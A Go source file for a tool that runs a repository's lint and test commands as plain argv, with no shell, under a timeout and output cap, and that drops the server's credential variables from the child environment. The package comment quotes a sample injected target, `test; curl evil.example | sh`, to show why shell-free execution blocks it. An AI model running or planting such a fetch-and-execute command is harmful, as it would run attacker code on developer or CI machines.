// Package checks runs a project's declared checks.
//
// The scope is deliberately narrow: one command, in one directory, with a
// timeout, and its output reported. There is no shell anywhere in the path, so
// there is no string to interpolate a repository's contents into — a Makefile
// target called `test; curl evil.example | sh` is a target that does not exist
// rather than a command that runs.
package checks

import (
	"bytes"
	"context"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"github.com/rroblf01/task-rabbit-mcp/pkg/toolchain"
)

// Result is what one check reported.
type Result struct {
	// Command is the argv, rendered for display.
	Command string `json:"command"`
	// ExitCode is -1 when the process never ran or was killed.
	ExitCode int    `json:"exitCode"`
	Duration string `json:"duration"`
	// Passed is exit code zero and not timed out. A check that cannot run is not a
	// passing check, which is the distinction that matters most here.
	Passed bool `json:"passed"`
	// Ran is false when the command could not be started at all — most often
	// because the tool is not installed. Reported separately from a failure,
	// because "ruff is not installed" and "ruff found nine problems" call for
	// opposite responses.
	Ran bool `json:"ran"`
	// TimedOut says the command was killed at the limit.
	TimedOut bool `json:"timedOut"`
	// Output is the captured output, capped. See Truncate for what survives a cap.
	Output string `json:"output"`
	// OutputBytes is how much was produced, so a caller can tell a short run from a
	// truncated one.
	OutputBytes int `json:"outputBytes"`
	// Truncated says Output is a cap of OutputBytes.
	Truncated bool `json:"truncated"`
	// Verdict says how Passed was decided, when the answer is not simply the exit
	// code. A check whose verdict is its output says so here, because "passed" on a
	// formatter that always exits 0 is otherwise indistinguishable from a real pass.
	Verdict string `json:"verdict,omitempty"`
	// Error is why the command could not run.
	Error string `json:"error,omitempty"`
}

// Options bound one run.
type Options struct {
	// Dir is the working directory. The check runs there and nowhere else.
	Dir string
	// Timeout bounds the run. Zero means DefaultTimeout.
	Timeout time.Duration
	// OutputLimit caps the reported output in bytes. Zero means DefaultOutputLimit.
	OutputLimit int
}

// Defaults. The timeout is generous because a full test suite is not fast; the
// point of a limit is to stop a hung process, not to enforce a speed budget.
const (
	DefaultTimeout     = 10 * time.Minute
	DefaultOutputLimit = 8 << 10
	// tailBytes is how much of the end is kept when output is capped.
	//
	// Both ends, deliberately. A linter's findings are all in the middle and fit;
	// a test suite's failure is at the end, and a head-only cap on a long log throws
	// away the only part that says what went wrong.
	tailBytes = 2 << 10
)

// Run executes one check.
//
// The command is an argv and is run without a shell, so nothing in the
// repository's own text can change what gets executed.
func Run(ctx context.Context, check toolchain.Check, opts Options) Result {
	timeout := opts.Timeout
	if timeout <= 0 {
		timeout = DefaultTimeout
	}
	limit := opts.OutputLimit
	if limit <= 0 {
		limit = DefaultOutputLimit
	}

	result := Result{Command: check.CommandLine(), ExitCode: -1}
	if len(check.Command) == 0 {
		result.Error = "the check declares no command"
		return result
	}

	started := time.Now()
	runCtx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()

	var output bytes.Buffer
	cmd := exec.CommandContext(runCtx, check.Command[0], check.Command[1:]...)
	cmd.Dir = opts.Dir
	// Combined, because that is what a developer sees in a terminal, and because a
	// caller reading one stream does not have to work out which half an error line
	// came from.
	cmd.Stdout = &output
	cmd.Stderr = &output
	cmd.Env = cleanEnv()

	runErr := cmd.Run()
	result.Duration = time.Since(started).Round(time.Millisecond).String()
	result.OutputBytes = output.Len()
	result.Output, result.Truncated = Truncate(output.String(), limit)

	switch {
	case errors.Is(runCtx.Err(), context.DeadlineExceeded):
		result.TimedOut = true
		result.Error = fmt.Sprintf("the check was killed after %s. That is a limit on how long this "+
			"server waits, not a verdict on the code: if the suite legitimately takes longer, "+
			"raise TASK_RABBIT_CHECK_TIMEOUT", timeout)
		return result
	case runErr == nil:
		result.Ran = true
		result.ExitCode = 0
		if check.NonEmptyOutputFails {
			// Read the output as the verdict. `gofmt -l` exits 0 whether or not
			// anything needs formatting, so a repository with unformatted files
			// would otherwise be reported as clean.
			if strings.TrimSpace(stripped(result.Output, result.Truncated)) == "" {
				result.Passed = true
				result.Verdict = "exit code 0 and no output, which for this check means nothing to report"
				return result
			}
			result.Verdict = "the command succeeded but printed output, which for this check is the finding"
			return result
		}
		result.Passed = true
		return result
	}

	var exitErr *exec.ExitError
	if errors.As(runErr, &exitErr) {
		result.Ran = true
		result.ExitCode = exitErr.ExitCode()
		return result
	}

	// Anything else means the command never started: not installed, not
	// executable, not found. That is not a failing check and must not read as one.
	result.Error = "the check could not be run: " + runErr.Error()
	return result
}

// Truncate caps text to n bytes, keeping the head and the tail.
//
// A byte-rune split would put a replacement character in the middle of a stack
// trace, which reads as corruption rather than as truncation.
func Truncate(text string, n int) (string, bool) {
	if n <= 0 || len(text) <= n {
		return text, false
	}
	// The tail is a quarter of the limit rather than a fixed 2 KB, so a small cap
	// still keeps some head. Dropping the head entirely would lose whatever the
	// command was doing, which is the context a reader needs to judge the tail.
	tail := tailBytes
	if n/4 < tail {
		tail = n / 4
	}
	head := n - tail
	if head <= 0 {
		return "… [the first " + strconv.Itoa(len(text)-n) + " bytes were dropped]\n" + text[len(text)-n:], true
	}
	cutHead := head
	for cutHead > 0 && !runeStart(text[cutHead]) {
		cutHead--
	}
	cutTail := len(text) - tail
	for cutTail < len(text) && !runeStart(text[cutTail]) {
		cutTail++
	}
	return text[:cutHead] +
		"\n… [" + strconv.Itoa(cutTail-cutHead) + " bytes omitted] …\n" +
		text[cutTail:], true
}

// stripped removes the ellipsis Truncate inserts, so a check's verdict is read
// from what the command actually said rather than from the cap.
func stripped(text string, truncated bool) string {
	if !truncated {
		return text
	}
	var b strings.Builder
	for _, line := range strings.Split(text, "\n") {
		if strings.HasPrefix(line, "… [") && strings.HasSuffix(line, "]") {
			continue
		}
		if b.Len() > 0 {
			b.WriteByte('\n')
		}
		b.WriteString(line)
	}
	return b.String()
}

// runeStart reports whether b starts a rune. A byte below 0x80 or above 0xBF does.
func runeStart(b byte) bool { return b&0xC0 != 0x80 }

// cleanEnv is what a check inherits: the operator's environment minus this
// server's own credentials.
//
// Inheritance matters: a curated allowlist breaks real projects in ways that look
// like a broken check — a Go build without GOPATH, a Python suite without
// VIRTUAL_ENV, a Node toolchain without its version manager's path. Filtering
// rather than curating keeps those working.
//
// What is filtered is the one real hazard. When this server is configured with a
// default instance, its API key is in the environment, and a test that prints its
// environment — which plenty do, on failure — would write it into a CI log. That
// is a credential leak into somewhere nobody is watching, so the variables that
// hold one are dropped before the child starts.
func cleanEnv() []string {
	prefixes := []string{"TASK_RABBIT_", "JIRRABIT_", "ANTHROPIC_", "OPENAI_"}
	env := make([]string, 0, len(os.Environ()))
	for _, entry := range os.Environ() {
		name := entry
		if i := strings.IndexByte(entry, '='); i >= 0 {
			name = entry[:i]
		}
		drop := false
		for _, prefix := range prefixes {
			if strings.HasPrefix(name, prefix) {
				drop = true
				break
			}
		}
		if !drop {
			env = append(env, entry)
		}
	}
	return env
}

// Summarize is one line per result, for a caller that ran several.
func Summarize(results []Result) string {
	var b strings.Builder
	for _, result := range results {
		switch {
		case result.Passed:
			b.WriteString("PASS  ")
		case result.TimedOut:
			b.WriteString("TIMEOUT ")
		case !result.Ran:
			b.WriteString("NOTRUN ")
		default:
			b.WriteString("FAIL  ")
		}
		b.WriteString(result.Command)
		b.WriteString("  (")
		b.WriteString(result.Duration)
		b.WriteString(")\n")
	}
	return b.String()
}
